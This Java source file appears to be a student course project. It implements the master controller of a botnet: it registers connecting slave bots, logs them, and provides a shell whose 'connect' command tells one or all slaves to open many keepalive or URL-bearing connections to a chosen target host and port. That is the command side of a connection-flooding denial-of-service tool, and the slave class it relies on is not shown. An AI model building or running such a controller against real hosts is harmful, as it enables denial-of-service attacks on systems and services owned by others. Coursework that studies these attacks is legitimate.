import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.concurrent.ThreadLocalRandom;;

public class MasterBot1 extends Thread{

	// class variables
	private ServerSocket serverSocket;
	static String targetAddress,ipAddOrHostNameOfSlave,noOfdisconnection;
	static String url=""; 
	static int targetPort, noOfConnections =1 ;
	static boolean keepAlive = false;
	static ArrayList<Socket> lstSlaveBotSockets = new ArrayList<>();
	private int port;
	private String ip;
	static SlaveBot1 b = new SlaveBot1();
	static HashMap<String, ArrayList<Socket>> tempMapOfSlaveObjecttoSocketwithMaster = new HashMap<String, ArrayList<Socket>>();
	//static ArrayList<SlaveBot> lstOfSlaveBot = new ArrayList<>();


	//constructor 
	public MasterBot1(){
	}



	public MasterBot1(int port) throws IOException {
		serverSocket = new ServerSocket(port);	
	}
	public MasterBot1(int port, String ip) throws IOException {
		this.port=port;
		this.ip=ip;
	}
	//run method for thread
	public void run() {
		int count=0;
		BufferedWriter output = null;
		String text = "";
		try {
			File file = new File("client_record.txt");
			output = new BufferedWriter(new FileWriter(file));
			Date date = new Date();
			text = "SlaveHostName\t\tIPAddress\tSourcePortNumber\tRegistrationDate"  ;
			output.write(text);

			while(true){
				count++;
				Socket slaveSocket = new Socket();
				slaveSocket = serverSocket.accept();
				lstSlaveBotSockets.add(slaveSocket);
				output.newLine();
				text = ""+slaveSocket.getRemoteSocketAddress() +"\t" ;
				output.write(text);
				text = "" + slaveSocket.getLocalAddress()+"\t";
				output.write(text);
				text = "\t" + serverSocket.getLocalPort() +"\t";
				output.write(text);
				text = "\t" + new SimpleDateFormat("yyyy-mm-dd").format(date);
				output.write(text);
				output.flush();  
				//System.out.println("Client: "+count +" IP ADDRESS: " + slaveSocket.getRemoteSocketAddress()+" PORT NUMBER: " + serverSocket.getLocalPort() + " RegistrationDate: " + new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime()));
			}		   
		}
		catch(IOException e){
			e.printStackTrace();
		}finally{
			try{
				serverSocket.close();
			}catch(IOException e){
				e.printStackTrace();
			}
		}

	}
	//main method
	public static void main(String[] args) {
		String commandLine;
		BufferedReader console = new BufferedReader(new InputStreamReader(System.in));
		int port=0;
		if(args.length!=0){
			port = Integer.parseInt(args[1]);
		}else{
			System.out.println("port number missing in argument, setting default value port= 3000");
			port = 3000; //default value.
		}
		//System.out.println("port "+ port);
		if(port != 0){
			try {
				Thread t = new MasterBot1(port);
				t.start();
			}catch(IOException e) {
				e.printStackTrace();
			}
		}
		// interactive shell code starts here
		while (true) {
			try{
				//while (true) {
				//read the command
				System.out.print(">");
				commandLine = console.readLine();
				//if just a return, loop
				if (commandLine.equals(""))
					continue;
				//help command :  not needed
				if (commandLine.equals("help")){
					System.out.println("Welcome to the shell");
					System.out.println("Written by: Tejas Rane");
					System.out.println("CMPE206- Proj1");
					System.out.println("--------------------");
					System.out.println("Commands to use:");
					System.out.println("1) list");
					System.out.println("2) connect  (IPAddressOrHostNameOfYourSlave|all) (TargetHostName|IPAddress) TargetPortNumber[NumberOfConnections: 1 if not specified]");
					System.out.println("3) disconnect  (IPAddressOrHostNameOfYourSlave|all) (TargetHostName|IPAddress) [TargetPort:all if no port specified]");
					System.out.println("4) exit");
					System.out.println();
				}
				if (commandLine.endsWith("list")){	// call lst function
					//System.out.println("SlaveHostName \t IPAddress \t \t SourcePortNumber \t RegistrationDate");
					BufferedReader br = null;
					String sCurrentLine;
					br = new BufferedReader(new FileReader("client_record.txt"));// reads the files and prints the data
					while ((sCurrentLine = br.readLine()) != null) {
						System.out.println(sCurrentLine);
					}
					/*for(int j =0; j< lstSlaveBotSockets.size();j++){
						System.out.print("Slave "+j);
						System.out.print("\t \t"+lstSlaveBotSockets.get(j).getRemoteSocketAddress());
						System.out.print("\t"+lstSlaveBotSockets.get(j).getLocalPort());
						System.out.print("\t \t \t"+"need to read file");
						System.out.println();
					}*/
				}
				if (commandLine.startsWith("connect")){	
					commandLine.trim();
					url=null;
					keepAlive=false;
					noOfConnections=1;
					String[] arrayOfString = commandLine.split("\\s+");
					/*for (int i = 0; i < arrayOfString.length; i++) {
						System.out.println(arrayOfString[i]);
					}*/
					ipAddOrHostNameOfSlave = arrayOfString[1]; // either selected one slave or value is all
					String tempipAddOrHostNameOfSlave="/"+ipAddOrHostNameOfSlave;
					targetAddress = arrayOfString[2]; // e.g google.com

					targetPort = Integer.parseInt(arrayOfString[3]); //e.g 80
					if(arrayOfString.length>4 && !(commandLine.contains("keepalive") || commandLine.contains("keepAlive"))){
						if(!arrayOfString[4].contains("url")){
							noOfConnections = Integer.parseInt(arrayOfString[4]); // how many socket do u want to create through selected slave/s
						}
						
					}else if(arrayOfString.length>4){
						if(arrayOfString[4].matches("^[1-9]\\d*$")){
						noOfConnections = Integer.parseInt(arrayOfString[4]);
						}
					}
					if(arrayOfString.length>5 && commandLine.contains("keepalive") || commandLine.contains("keepAlive")){
						keepAlive = true; // keep alive option is provided
					}
					if(commandLine.contains("url")){
						String temp= commandLine.substring(commandLine.lastIndexOf("url")+4);
						url=temp;
					}
					if(commandLine.contains("keepalive") || commandLine.contains("keepAlive")){
						keepAlive = true; // keep alive option is provided
					}
					//when all slaves are selected.
					if(ipAddOrHostNameOfSlave.equalsIgnoreCase("all")){
						for(int k=0; k<lstSlaveBotSockets.size();k++){	 
							tempMapOfSlaveObjecttoSocketwithMaster = b.connectToRemoteHost(targetPort,targetAddress,lstSlaveBotSockets.get(k),noOfConnections,keepAlive,url);
						}

					}
					else{//code to select particular slave
						for(int k=0; k<lstSlaveBotSockets.size();k++){	 
							if(tempipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveBotSockets.get(k).getRemoteSocketAddress().toString())||
									tempipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveBotSockets.get(k).getLocalAddress().toString()) ||
									ipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveBotSockets.get(k).getRemoteSocketAddress().toString()) ||
									ipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveBotSockets.get(k).getLocalAddress().toString())){
								//System.out.println("caught");
								tempMapOfSlaveObjecttoSocketwithMaster = b.connectToRemoteHost(targetPort,targetAddress,lstSlaveBotSockets.get(k),noOfConnections,keepAlive,url);
							}

						}

					}
				}

				if (commandLine.startsWith("disconnect")){
					commandLine.trim();
					String temptargetPort= null;
					String[] arrayOfString = commandLine.split("\\s+");
					ipAddOrHostNameOfSlave = arrayOfString[1]; // either selected one slave or value is all
					String tempipAddOrHostNameOfSlave="/"+ipAddOrHostNameOfSlave;
					targetAddress = arrayOfString[2]; // e.g google.com

					if(arrayOfString.length>3){
						targetPort = Integer.parseInt(arrayOfString[3]); // [TargetPort:all if no port specified]
					}else{
						temptargetPort="all";
					}

					if(ipAddOrHostNameOfSlave.equalsIgnoreCase("all")){//disconnect all slaves
						for(int k=0; k<lstSlaveBotSockets.size();k++){	 //iterate over all slave sockets
							//if(temptargetPort!=null){
							//if(temptargetPort.equalsIgnoreCase("all")){
							for(String key: tempMapOfSlaveObjecttoSocketwithMaster.keySet()){
								ArrayList<Socket> temp=tempMapOfSlaveObjecttoSocketwithMaster.get(key);
								if(temp.size()!=0){
									for(int i= 0; i <temp.size();i++){
										if(temp.get(i).getInetAddress().toString().contains(targetAddress)){
											if(temptargetPort!=null){
												if(temptargetPort.equalsIgnoreCase("all")){
													b.disconnectFromRemoteHost(targetPort,targetAddress,temp.get(i),temptargetPort);// ignore target port in slave as its all
													temp.remove(i);
												}
											}else {
												b.disconnectFromRemoteHost(targetPort,targetAddress,temp.get(i));//disconnect specific connection identified by target port
												temp.remove(i);
											}
										}
									}
								}
							}


							//b.disconnectFromRemoteHost(targetPort,targetAddress,lstSlaveBotSockets.get(k),temptargetPort);// ignore target port in slave as its all
							//}
							/*}else{
								if(lstSlaveBotSockets.get(k).getLocalPort()==targetPort){ // passed only socket for which given port is specified in command
									b.disconnectFromRemoteHost(targetPort,targetAddress,lstSlaveBotSockets.get(k));//disconnect specific connection identified by target port
								}
							}*/
						}
					}else{
						for(int k=0; k<lstSlaveBotSockets.size();k++){	//iterate over all sockets..choose particular slave socket 

							if(tempipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveBotSockets.get(k).getRemoteSocketAddress().toString())||
									tempipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveBotSockets.get(k).getLocalAddress().toString()) ||
									ipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveBotSockets.get(k).getRemoteSocketAddress().toString()) ||
									ipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveBotSockets.get(k).getLocalAddress().toString())){
								//need to select all created sockets of selected slave

								for(String key: tempMapOfSlaveObjecttoSocketwithMaster.keySet()){
									if(key.equalsIgnoreCase(lstSlaveBotSockets.get(k).getLocalAddress().toString()) ||
											key.equalsIgnoreCase(lstSlaveBotSockets.get(k).getRemoteSocketAddress().toString())){
										ArrayList<Socket> temp=tempMapOfSlaveObjecttoSocketwithMaster.get(key);
										if(temp.size()!=0){
											for(int i= 0; i <temp.size();i++){
												if(temp.get(i).getInetAddress().toString().contains(targetAddress)){
													//b.disconnectFromRemoteHost(targetPort, targetAddress, temp.get(i));// slave function will just close connection to passed socket
													if(temptargetPort!=null){
														if(temptargetPort.equalsIgnoreCase("all")){
															b.disconnectFromRemoteHost(targetPort,targetAddress,temp.get(i),temptargetPort);// ignore target port in slave as its all
															temp.remove(i);
														}
													}else {
														b.disconnectFromRemoteHost(targetPort,targetAddress,temp.get(i));//disconnect specific connection identified by target port
														temp.remove(i);
													}
												}
											}
										}
									}

								}

								/*if(temptargetPort!=null){
									if(temptargetPort.equalsIgnoreCase("all")){
										b.disconnectFromRemoteHost(targetPort,targetAddress,lstSlaveBotSockets.get(k),temptargetPort);// ignore target port in slave as its all
									}
								}else{
									b.disconnectFromRemoteHost(targetPort,targetAddress,lstSlaveBotSockets.get(k));//disconnect specific connection identified by target port
								}*/
							}

						}
					}

				}
				if (commandLine.equals("-1") || commandLine.equals("exit")){	
					System.out.println("...Terminating the shell");
					System.out.println("...Done");
					System.out.println("Please Close manually with Options > Close");
					System.exit(0);
				}

				//}
			}catch(Exception e){
				System.out.println("-1");
			}
		}
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}


}
